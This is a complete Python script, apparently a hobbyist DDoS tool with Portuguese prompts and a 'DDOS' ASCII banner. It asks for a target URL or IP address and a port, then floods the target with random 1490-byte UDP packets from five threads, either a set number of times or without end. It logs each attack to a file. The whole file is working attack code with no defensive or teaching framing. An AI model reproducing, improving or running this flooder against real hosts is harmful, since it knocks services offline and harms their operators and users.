from colorama import Fore, init

import socket
import random
from urllib.parse import urlparse
import threading
import logging
import time


init(autoreset=True)

logging.basicConfig(
    filename='ataques.log', 
    level=logging.INFO, 
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def validar_porta(porta):
    
    if porta < 1 or porta > 65535:
        raise ValueError("Porta inválida. Insira um valor entre 1 e 65535.")

def validar_quantidade(quantidade):
    
    if quantidade < 0:
        raise ValueError("quantidade não pode ser negativa.")

def https():
    
    
    url = input("digite a URL do alvo (com http:// ou https://): ")
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    
    try:
        porta = int(input("qual porta voce quer atacar? (geralmente 80 ou 443): "))
        validar_porta(porta)
        quantidade = int(input("quantas vezes voce quer atacar? (coloque 0 para ataque indefinido): "))
        validar_quantidade(quantidade)
    except ValueError as e:
        print(Fore.RED + f"Erro na entrada: {e}")
        return None, None, None
    
    return hostname, porta, quantidade

def executar_ataque(target, bytes, quantidade):
   
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pacotes_enviados = 0

    try:
        if quantidade == 0:
        
            start_time = time.time()
            print(Fore.YELLOW + "atacando indefinidamente... pressione Ctrl+C para parar")
            while True:
                sock.sendto(bytes, target)
                pacotes_enviados += 1
                print(Fore.GREEN + f"pacote enviado... total: {pacotes_enviados}")
        else:
            
            for _ in range(quantidade):
                sock.sendto(bytes, target)
                pacotes_enviados += 1
                print(Fore.GREEN + f"pacote enviado... total: {pacotes_enviados}")
    except KeyboardInterrupt:
        print(Fore.CYAN + "ataque interrompido pelo usuario")
    except Exception as e:
        print(Fore.RED + f"erro durante o ataque: {e}")
    finally:
        sock.close()
        logging.info(f"ataque concluido no alvo {target[0]}:{target[1]} com {pacotes_enviados} pacotes enviados.")

def main(hostname, porta, quantidade):
    # inicia o ataque
    if not hostname or not porta:
        print(Fore.RED + "entrada invalida encerrando...")
        return

    try:
        ip = socket.gethostbyname(hostname)
        target = (ip, porta)
        print(Fore.YELLOW + f"Iniciando ataque no alvo {target[0]}:{target[1]}")
        bytes = random._urandom(1490)
        
        
        threads = []
        num_threads = 5  
        for _ in range(num_threads):
            thread = threading.Thread(target=executar_ataque, args=(target, bytes, quantidade))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        print(Fore.CYAN + "ataque concluido")
    except socket.gaierror:
        print(Fore.RED + "hostname invalido nao foi possivel resolver o IP")
    except Exception as e:
        print(Fore.RED + f"ocorreu um erro geral: {e}")
def ip_attack():
    
    try:
        ip = input("digite o endereço IP do alvo: ")

        socket.inet_aton(ip)  

        porta = int(input("qual porta voce quer atacar? (geralmente 80 ou 443): "))

        validar_porta(porta)

        quantidade = int(input("quantas vezes voce quer atacar? (coloque 0 para ataque indefinido): "))
        validar_quantidade(quantidade)
    except socket.error:
        print(Fore.RED + "Erro: IP inválido.")

        return None, None, None
    except ValueError as e:
        print(Fore.RED + f"Erro na entrada: {e}")

        return None, None, None
    
    return ip, porta, quantidade

def main_ip(ip, porta, quantidade):
    
    if not ip or not porta:
        print(Fore.RED + "entrada invalida encerrando...")
        return

    try:
        target = (ip, porta)
        print(Fore.YELLOW + f"iniciando ataque no alvo {target[0]}:{target[1]}")

        bytes = random._urandom(1490)
        
        threads = []
        num_threads = 5  
        for _ in range(num_threads):
            thread = threading.Thread(target=executar_ataque, args=(target, bytes, quantidade))

            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        print(Fore.CYAN + "ataque concluido!")
    except Exception as e:
        print(Fore.RED + f"ocorreu um erro geral: {e}")

def painel():
    
    while True:
        try:
            opcao = int(input(Fore.CYAN + """
            ██████╗ ██████╗  ██████╗ ███████╗
            ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
            ██║  ██║██║  ██║██║   ██║███████╗
            ██║  ██║██║  ██║██║   ██║╚════██║
            ██████╔╝██████╔╝╚██████╔╝███████║
            ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
            [1] para atacar com HTTPS
            [2] para atacar com IP 
            [0] para sair
            Opção: """))
            
            if opcao == 1:
                hostname, porta, quantidade = https()
                main(hostname, porta, quantidade)
            elif opcao == 2:
                ip, porta, quantidade = ip_attack()
                main_ip(ip, porta, quantidade)

            elif opcao == 0:
                print(Fore.CYAN + "saindo...")
                break
            else:
                print(Fore.RED + "opção invalida tente novamente")
        except ValueError:
            print(Fore.RED + "erro: por favor, insira um numero valido")


painel()
